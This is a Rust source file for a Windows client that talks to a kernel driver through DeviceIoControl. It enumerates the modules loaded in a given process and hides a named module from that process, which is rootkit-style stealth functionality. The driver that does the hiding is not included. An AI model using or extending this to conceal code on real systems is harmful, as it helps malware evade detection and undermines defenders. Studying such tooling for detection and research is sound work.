use std::{ffi::c_void, mem::size_of, ptr::null_mut};
use log::{info, error, debug};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::IO::DeviceIoControl,
};

use crate::utils::open_driver;
use common::structs::{
    ModuleInfo, 
    TargetModule, 
    TargetProcess
};

/// Provides operations for managing modules within a process through a driver interface.
pub struct Module(HANDLE);

impl Module {
    /// Creates a new `Module` instance, opening a handle to the driver.
    ///
    /// # Returns
    ///
    /// * An instance of `Module`.
    ///
    /// # Panics
    ///
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let h_driver = open_driver().expect("Error");
        Self(h_driver)
    }

    /// Enumerates all modules within a specified process by `pid`.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the enumeration operation.
    /// * `pid` - A reference to the PID of the process whose modules will be enumerated.
    pub fn enumerate_module(self, ioctl_code: u32, pid: &u32) {
        info!("Attempting to enumerate modules for PID: {pid}");

        debug!("Preparing structure for pid: {pid}");
        let mut module_info: [ModuleInfo; 400] = unsafe { std::mem::zeroed() };
        let mut input_module = TargetProcess {
            pid: *pid as usize,
            ..Default::default()
        };

        debug!("Sending DeviceIoControl command to enumerate modules for PID: {pid}");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.0,
                ioctl_code,
                &mut input_module as *mut _ as *mut c_void,
                size_of::<TargetProcess>() as u32,
                module_info.as_mut_ptr().cast(),
                (module_info.len() * size_of::<ModuleInfo>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl failed with status: 0x{:08X} for PID: {pid}", unsafe { GetLastError() } );
        } else {
            let total_modules = return_buffer as usize / size_of::<ModuleInfo>();
            info!("Total modules found for PID {pid}: {total_modules}");
            info!("Listing modules:");
            println!();

            for module in module_info.iter() {
                if module.address > 0 {
                    let name = match String::from_utf16(&module.name) {
                        Ok(name) => name,
                        Err(err) => {
                            error!("UTF-16 decoding error: {:?}", err);
                            continue;
                        }
                    };
                    println!("[{}] {:p} {}", module.index, module.address as *mut c_void, name);
                }
            }

            println!();
            info!("Module enumeration completed for PID: {pid}");
        }
    }

    /// Hides a specific module within a process specified by `pid`.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the hide operation.
    /// * `name` - A reference to the module name to hide.
    /// * `pid` - The PID of the process containing the module to hide.
    pub fn hide_module(self, ioctl_code: u32, name: &String, pid: u32) {
        debug!("Attempting to open the module for hide operation");

        debug!("Preparing structure for: {}", name);
        let mut info_driver = TargetModule {
            module_name: name.to_string(),
            pid: pid as usize,
        };

        debug!("Sending DeviceIoControl command to hide module");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.0,
                ioctl_code,
                &mut info_driver as *mut _ as *mut c_void,
                size_of::<TargetModule>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Module successfully hidden");
        }
    }
}

impl Drop for Module {
    /// Ensures the driver handle is closed when `Module` goes out of scope.
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.0) };
    }
}
